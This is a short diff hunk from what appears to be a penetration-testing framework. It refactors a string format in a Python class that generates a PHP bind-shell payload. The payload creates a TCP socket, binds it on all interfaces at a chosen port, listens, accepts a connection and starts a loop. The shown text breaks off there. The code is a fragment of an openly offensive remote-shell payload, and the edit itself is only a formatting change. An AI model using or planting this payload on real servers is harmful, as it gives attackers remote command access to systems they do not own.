@@ -23,7 +23,7 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
     def generate(self):
         return (
             "$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);" +
-            "socket_bind($s,\"0.0.0.0\",{});".format(self.rport) +
+            f"socket_bind($s,\"0.0.0.0\",{self.rport});" +
             "socket_listen($s,1);" +
             "$cl=socket_accept($s);" +
             "while(1){" +
